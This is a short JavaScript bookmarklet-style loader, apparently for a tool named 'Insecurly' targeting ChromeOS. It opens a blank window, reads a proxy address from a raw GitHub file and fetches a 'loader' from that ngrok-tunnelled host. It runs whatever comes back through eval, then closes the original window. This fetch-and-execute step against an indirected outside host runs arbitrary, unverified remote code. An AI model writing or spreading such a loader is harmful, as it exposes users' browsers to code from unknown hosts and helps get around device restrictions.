var win = window.open('about:blank', "_blank", "noopener");
win.document.write("<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'><body><script>" + `
(async () => {
    try {
	const link_res = await fetch('https://raw.githubusercontent.com/insecurly/insecurly.github.io/refs/heads/main/proxy.txt');
	const link = await link_res.text();
	
        const response = await fetch(link + '/get_loader?device=chromeos', {
            method: 'GET', 
            headers: {
                'ngrok-skip-browser-warning': 'true' 
            }
        });
	
        if (!response.ok) {
            throw new Error('Failed to fetch loader');
        }
        const code = await response.text();
        eval(code);
    } catch (error) {
        alert("Insecurly is down. Please try again later.");
    }
})();` + "</script></body></html>");
win.document.close();
window.close();
